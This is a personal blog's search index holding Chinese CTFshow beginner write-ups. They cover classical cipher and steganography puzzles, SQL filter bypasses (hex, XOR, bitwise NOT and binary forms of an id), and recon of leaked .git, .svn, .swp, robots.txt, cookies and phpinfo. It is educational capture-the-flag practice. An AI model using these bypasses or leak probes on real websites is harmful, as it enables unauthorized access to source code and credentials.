<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFshow萌新区密码+隐写</title>
    <url>/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h2 id="萌新区-密码1"><a href="#萌新区-密码1" class="headerlink" title="萌新区 密码1"></a>萌新区 密码1</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/1.1.png"><br>密文一看就是十六进制，先将十六进制转换为字符串<br>结果如下所示</p>
<span id="more"></span>
<p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/1.2.png"><br>这个【=】懂得都懂 我们直接上base64<br>这里有一点需要注意一下 并不是所有的后面带【=】的就一定是base64<br>当初base58的设计用意便是混淆base64<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/1.3.png"><br>观察一下 加上给个提示格式是KEY{} 不难看出这个是栅栏密码<br>分成两部分然后一上一下竖着看即可 这里我们直接用在线工具了<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/1.4.png"><br>先肉眼看一下，栏数是2<br>然后拆成两串<br>KYdf0a3ebd5c4dc160-<br>E{fb63ee0298b8f4d8}<br>然后竖过来读<br>工具赛高 ！！！<br>出答案这里让我自己看我会晕的QAQ</p>
<h2 id="萌新区-密码2"><a href="#萌新区-密码2" class="headerlink" title="萌新区 密码2"></a>萌新区 密码2</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/2.1.png"><br>做题人也很累 低头看了看键盘<br>看看电脑键盘 就会发现这些字母包围的分别是f w y<br>flag为KEY{fwy}</p>
<h2 id="萌新区-密码3"><a href="#萌新区-密码3" class="headerlink" title="萌新区 密码3"></a>萌新区 密码3</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/3.1.png"><br>摩斯密码 二话不说先转一下<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/3.2.png"><br>解密出来的内容里有提示是培根密码<br>因此提取后面的md 将m换成A，d换成B<br>就是AABBABABAAABBBABABBAAAAAAABBABAABBA<br>然后在线工具了解一下</p>
<blockquote>
<p>每个英文字母都可以用AB来表示，而且都是5个A或B的组合</p>
</blockquote>
<p>题目共有35个AB 这也就说明解密出来的东西是7个英文字母组成的</p>
<p>培根密码实际上就是一种替换密码，对应转换即可加密解密 。它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏</p>
<p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/3.3.png"></p>
<h2 id="萌新区-密码-4"><a href="#萌新区-密码-4" class="headerlink" title="萌新区 密码#4"></a>萌新区 密码#4</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/4.1.png"><br>上来先base64伺候<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/4.2.png"><br>【&lt;】是html的&lt;，有些base64解码能写成&lt;，有一些不能<br>有的base85能解出来粗糙的 有些就直接不给解出来 需注意格式<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/4.3.png"></p>
<h2 id="萌新区-萌新-隐写2"><a href="#萌新区-萌新-隐写2" class="headerlink" title="萌新区 萌新 隐写2"></a>萌新区 萌新 隐写2</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx2.1.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx2.2.png"><br>附件的压缩包需要密码<br>直接上破解工具<br>破解的时间比较长 闲来无事搜了一下这道题的wp  发现最早这道题是给的有提示的<br>天啊 不早说 等的好辛苦T T<br>Hint:文件的主人喜欢用生日做密码，而且还是个90后。<br>生日的话 我们可以做一个密码字典 这样会快一点 纯数字也好破解<br>密码为19981000 打开压缩包即可获取flag</p>
<h2 id="萌新区-萌新-隐写3"><a href="#萌新区-萌新-隐写3" class="headerlink" title="萌新区 萌新 隐写3"></a>萌新区 萌新 隐写3</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx3.1.jpg"><br>flag就在图片上</p>
<h2 id="萌新区-萌新-隐写4"><a href="#萌新区-萌新-隐写4" class="headerlink" title="萌新区 萌新 隐写4"></a>萌新区 萌新 隐写4</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx4.2.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx4.3.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx4.4.jpg"><br>Word设置显示隐藏文字即可 </p>
<h2 id="萌新区-萌新-隐写5"><a href="#萌新区-萌新-隐写5" class="headerlink" title="萌新区 萌新 隐写5"></a>萌新区 萌新 隐写5</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx5.1.png"><br>中文转Unicode编码<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx5.2.png"><br>然后16进制转字符<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/yx5.3.png"><br>然后base32解码即可得出结果</p>
<h2 id="萌新区-萌新-隐写6"><a href="#萌新区-萌新-隐写6" class="headerlink" title="萌新区 萌新 隐写6"></a>萌新区 萌新 隐写6</h2><p>用audacity打开音频，发现左声道是摩斯电码<br>把右声道静音，音量提高然后导出来<br>找一个在线的摩斯电码音频解码的网站<br>然后上传就行了<br>不知道为啥我没解成功  好像我的声音还是太小了</p>
<h2 id="萌新区-隐写1"><a href="#萌新区-隐写1" class="headerlink" title="萌新区 隐写1"></a>萌新区 隐写1</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX1.1.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX1.2.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX1.3.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX1.4.png"><br>懒得打字了 直接看图吧 懂得都懂</p>
<h2 id="萌新区-隐写2"><a href="#萌新区-隐写2" class="headerlink" title="萌新区 隐写2"></a>萌新区 隐写2</h2><p><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX2.10.png"><br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX2.3.png"><br>提示已经很明显了 我们直接走JPHS<br>然后打开看一下 flag就是这么的简单明了<br><img src="/2021/01/14/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E5%AF%86%E7%A0%81-%E9%9A%90%E5%86%99/YX2.20.png"></p>
<hr>
<blockquote>
<p>“我即辰星，我即黎明。”</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>CTFshow刷题合集</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow 萌新web1-8</title>
    <url>/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/</url>
    <content><![CDATA[<h2 id="萌新区web1"><a href="#萌新区web1" class="headerlink" title="萌新区web1"></a>萌新区web1</h2><p>web选手培养中……<br>CTFshow这个平台简直不要太赞，以后刷题就在这里了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.0.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.1.png"><br>既然没有漏洞那我就不做了吧（滑稽）<br>这个注释，可以说很照顾萌新了</p>
<span id="more"></span>
<p>flag in id=1000  flag已经告诉我们在哪里了，所以我们只需要用sql执行语句查找就行了<br>直接大于999会出现错误提示<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.2.png"><br>所以我们给它加点料嘻嘻(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.3.png"><br>后来想了想，应该不止一种解法 应该还可以用十六进制（用0x3e8绕过）<br>用十六进制就好比试卷上的计算题1+1+=？答案那里你写了个two类似吧~<br>（当然解法也能用二进制，也可以用别的方法）</p>
<h2 id="萌新区web2"><a href="#萌新区web2" class="headerlink" title="萌新区web2"></a>萌新区web2</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.1.png"><br>应该还是有问题的（）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.2.png"><br>看着跟web1差不多嘛…<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.3.png"><br>所以这跟web1有什么区别吗？？</p>
<h2 id="萌新区web3"><a href="#萌新区web3" class="headerlink" title="萌新区web3"></a>萌新区web3</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.1.png"><br>没问题吗？我不信233333<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.2.png"><br>没有过滤【‘’】 所以……(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.3.png"><br>这跟web1 web2 有什么区别吗？</p>
<h2 id="萌新区web4"><a href="#萌新区web4" class="headerlink" title="萌新区web4"></a>萌新区web4</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.1.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.2.png"><br>依然可以用【‘’】 不多说了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.3.png"></p>
<h2 id="萌新区web5"><a href="#萌新区web5" class="headerlink" title="萌新区web5"></a>萌新区web5</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.1.png"><br>痛下杀手可还行<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.2.png"><br>这次多加了正则匹配，不能用?id=’1000’来解题了<br>可以使用【^】按位异或来绕过<br>1000的二进制是1111101000<br>只要找两个按位异或就行了，比如1111100000（992）和1000（8）</p>
<h2 id="萌新区web6"><a href="#萌新区web6" class="headerlink" title="萌新区web6"></a>萌新区web6</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.1.png"><br>我猜这回不能按位异或了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.2.png"><br>果然……<br>不过不能按位异或，我们还可以取反呀~~<br>~~（双重含义）（笑）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.3.png"></p>
<h2 id="萌新区web7"><a href="#萌新区web7" class="headerlink" title="萌新区web7"></a>萌新区web7</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.1.png"><br>我猜取反也给过滤了<br>如果取反也过滤了，就只能输入1111101000惹<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.2.png"><br>恩 我们输入二进制的1000 开头加上【0b】表示是二进制<br>1+1=two？这谁写的答案啊（恼）<br>……算了也算对的吧 放你一马<br>大概是这样子的（雾）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.3.png"></p>
<h2 id="萌新区web8"><a href="#萌新区web8" class="headerlink" title="萌新区web8"></a>萌新区web8</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.1.png"><br>0.0    哦豁？被辞职了？<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.2.png"><br>这个代码……emmmmm<br>看了一眼write up  好家伙，阿呆删库跑路了 无形玩梗最为致命hhh<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.3.png"></p>
<blockquote>
<blockquote>
<p>现在是2020年1月10日 0:19 萌新专区web1-8【阿呆第一季】结束了<br>毫无睡意，但是不是很想写web了  所以干点别的去(#^.^#)<br>不出意外接下来几天会写点别的 web暂时这样吧~~</p>
</blockquote>
</blockquote>
<hr>
<p>这是放寒假的时候从1月9日-1月10日做的萌新web题，现在把这个write up作为我在博客上的第一篇文章摆在这里，markdown语法一点也不难，纯粹为了写文章服务。非常非常赞！写write up也算是为我学习添了一点动力。希望自己能坚持下去吧！</p>
<hr>
<blockquote>
<p>阳光下的泡沫，是彩色的。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>CTFshow刷题合集</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-Web入门-信息搜集1-20</title>
    <url>/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/</url>
    <content><![CDATA[<h2 id="信息搜集-Web1"><a href="#信息搜集-Web1" class="headerlink" title="信息搜集 Web1"></a>信息搜集 Web1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：开发注释未及时删除导致源码泄露 </span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/1.0.png"><br>直接F12查看源码即可得到flag，懒得详说了</p>
<span id="more"></span>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/1.1.png"></p>
<h2 id="信息搜集-Web2"><a href="#信息搜集-Web2" class="headerlink" title="信息搜集 Web2"></a>信息搜集 Web2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：js前台拦截与绕过</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/2.1.png"><br><strong>1 Ctrl+U</strong><br><strong>2 网址前面加上view-source:</strong><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/2.3.png"><br><strong>3 Ctrl+Shift+I（或者浏览器右上角的设置栏里选择开发者工具）</strong><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/2.2.png"></p>
<h2 id="信息搜集-Web3"><a href="#信息搜集-Web3" class="headerlink" title="信息搜集 Web3"></a>信息搜集 Web3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：简单的burpsuite抓包，协议头泄露</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/3.1.png"></p>
<h2 id="信息搜集-Web4"><a href="#信息搜集-Web4" class="headerlink" title="信息搜集 Web4"></a>信息搜集 Web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：robots.txt后台泄露</span><br></pre></td></tr></table></figure>
<p>直接访问url/robots.txt<br>打开下载的文件即可获取flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/4.1.png"></p>
<h2 id="信息搜集-Web5"><a href="#信息搜集-Web5" class="headerlink" title="信息搜集 Web5"></a>信息搜集 Web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：phps源码泄露</span><br></pre></td></tr></table></figure>
<p>直接访问index.phps获得flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/5.1.png"></p>
<h2 id="信息搜集-Web6"><a href="#信息搜集-Web6" class="headerlink" title="信息搜集 Web6"></a>信息搜集 Web6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：源码压缩包泄露</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/6.1.png"><br>不过这个不是正确答案<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/6.2.png"><br>得到提示flag就在fl000.txt里<br>于是决定去网址那里碰运气<br>然后得到了flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/6.3.png"></p>
<h2 id="信息搜集-Web7"><a href="#信息搜集-Web7" class="headerlink" title="信息搜集 Web7"></a>信息搜集 Web7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：版本控制泄露源码</span><br></pre></td></tr></table></figure>
<p>直接访问url/.git/index.php即可得到flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/7.1.png"></p>
<blockquote>
<p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。<br>访问/.git<br>git中的Log功能可以查看提交历史。<br>stash命令可用于临时保存和恢复修改，可跨分支。</p>
</blockquote>
<h2 id="信息搜集-Web8"><a href="#信息搜集-Web8" class="headerlink" title="信息搜集 Web8"></a>信息搜集 Web8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：考察信息svn泄露</span><br></pre></td></tr></table></figure>
<p>直接访问url/.svn即可得到flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/1.1.png"></p>
<blockquote>
<p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p>
</blockquote>
<h2 id="信息搜集-Web9"><a href="#信息搜集-Web9" class="headerlink" title="信息搜集 Web9"></a>信息搜集 Web9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：vim临时文件泄露</span><br></pre></td></tr></table></figure>
<p>直接访问url/index.php.swp   下载打开，就可以得到flag</p>
<blockquote>
<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
</blockquote>
<p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<h2 id="信息搜集-Web10"><a href="#信息搜集-Web10" class="headerlink" title="信息搜集 Web10"></a>信息搜集 Web10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：cookie泄露</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/10.1.png"><br>url解码即可</p>
<blockquote>
<p><a href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p>
</blockquote>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/10.2.png"><br>第二种解法：<br>F12，点击储存栏发现，一个名为flag的cookie数据，里面就有flag</p>
<h2 id="信息搜集-Web11"><a href="#信息搜集-Web11" class="headerlink" title="信息搜集 Web11"></a>信息搜集 Web11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：域名txt记录泄露</span><br></pre></td></tr></table></figure>
<blockquote>
<p>TXT 记录，一般指为某个主机名或域名设置的说明<br><a href="http://www.pucha.net/">http://www.pucha.net/</a></p>
</blockquote>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/11.1.png"></p>
<h2 id="信息搜集-Web12"><a href="#信息搜集-Web12" class="headerlink" title="信息搜集 Web12"></a>信息搜集 Web12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：敏感信息公布</span><br></pre></td></tr></table></figure>
<p>打开环境，发现是一个购物网站<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.1.png"><br>hint说让我们看一眼robots.txt 于是我们访问一下<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.2.png"><br>发现提示 让我们去admin界面<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.3.png"><br>于是进入admin界面，发现需要输入账户密码才能登录<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.4.png"><br>密码可能就在网页里，发现网页底部有一串数字<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.5.png"><br>尝试了一下，发现就是登录密码并获取了flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/12.6.png"></p>
<h2 id="信息搜集-Web13"><a href="#信息搜集-Web13" class="headerlink" title="信息搜集 Web13"></a>信息搜集 Web13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：内部技术文档泄露</span><br></pre></td></tr></table></figure>
<p>打开环境后，发现又是一个购物网站<br>尝试随便点点找找突破口<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/13.1.png"><br>底部doucument可以点开 进入后发现存有登录界面和账户密码的文件<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/13.2.png"><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/13.3.png"><br>登录进去<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/13.4.png"><br>登录即可获取flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/13.5.png"></p>
<h2 id="信息搜集-Web14"><a href="#信息搜集-Web14" class="headerlink" title="信息搜集 Web14"></a>信息搜集 Web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：编辑器配置不当，有时候源码里面就能不经意间泄露重要(editor)的信息</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/14.1.png"><br>我觉得你在内涵某绿色图标的软件，但我没有证据<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/14.2.png"><br>根据提示进入editor界面 随便点点发现上传图片那里有端倪<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/14.3.png"><br>完整的目录 试着找找看有没有flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/14.4.png"><br>还真的有flag  在  var/www/html/nothinghere/fl000g.txt<br>接下来url 访问 /nothinghere/fl000g.txt即可<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/14.5.png"></p>
<h2 id="信息搜集-Web15"><a href="#信息搜集-Web15" class="headerlink" title="信息搜集 Web15"></a>信息搜集 Web15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：密码逻辑脆弱</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.0.png"><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.1.png"><br>来到admin界面 发现有个忘记密码的选项 点进去<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.2.png"><br>需要输入城市所在地<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.3.png"><br>然后回到之前的界面发现底部的联系方式有个QQ邮箱<br>QQ搜索一番发现显示陕西西安  于是输入西安<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.4.png"><br>获得密码<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.5.png"><br>登录即可得到flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/15.6.png"></p>
<h2 id="信息搜集-Web16"><a href="#信息搜集-Web16" class="headerlink" title="信息搜集 Web16"></a>信息搜集 Web16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：探针泄露</span><br></pre></td></tr></table></figure>
<p>还挺酷的<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/16.1.png"><br>cool！！！<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/16.2.png"><br>url/tz.php访问一下，发现版本是雅黑PHP探针</p>
<blockquote>
<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/16.4.png"><br>查看phpinfo信息并搜索flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/16.5.png"><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/16.6.png"></p>
</blockquote>
